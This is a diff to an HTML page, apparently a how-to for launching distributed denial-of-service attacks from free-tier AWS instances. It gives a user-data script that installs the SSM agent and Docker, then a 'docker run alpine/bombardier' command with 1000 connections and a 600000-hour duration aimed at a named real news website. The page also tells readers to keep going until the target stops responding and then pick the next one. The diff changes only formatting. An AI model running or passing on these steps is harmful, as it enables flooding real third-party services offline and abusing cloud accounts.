@@ -89,7 +89,7 @@
                 (don't forget about the number of free one month usage in 750 years). All other parameters are defaulted, 
                 but look for <b>IAM Role</b> and select the previously created role and the next important parameter <b>User Data</b>:</li>
 <p>
- #!/bin/bash <br>
+ <i>#!/bin/bash <br>
 
  mkdir /tmp/ssm <br>
                         
@@ -103,7 +103,7 @@
                         
  sudo systemctl enable amazon-ssm-agent <br>
                         
- sudo snap install docker <br>
+ sudo snap install docker <br> </i>
 </p>
                     
             <li>Next click Review and Launch --- Launch --- Procceed without a key pair --- I acknowledge that without a key pair... --- Launch Instance</li>
@@ -116,13 +116,13 @@
       </ol>
       Example: <br>
 <p>
-docker run -d --rm alpine/bombardier -c 1000 -
-d 600000h https://lenta.ru
+<i> docker run -d --rm alpine/bombardier -c 1000 -
+d 600000h https://lenta.ru </i>
 </p>
       After the target stops responding through the anonimous browser, you can terminate the instance or go to the next target. 
       Check if the container is running: docker ps -a command. Stop docker container: docker stop {id container}.
 
-      Source: <a href="https://telegra.ph/YAk-DDoS-ti-z-Free-Tier-z-Amazon-Cloud-03-05?from=tg&utm_source=telegram&utm_medium=social">link</a>.  
+      <h1> Source: <a href="https://telegra.ph/YAk-DDoS-ti-z-Free-Tier-z-Amazon-Cloud-03-05?from=tg&utm_source=telegram&utm_medium=social">link</a>.  </h1>
       </section>
 
       <section id="home">
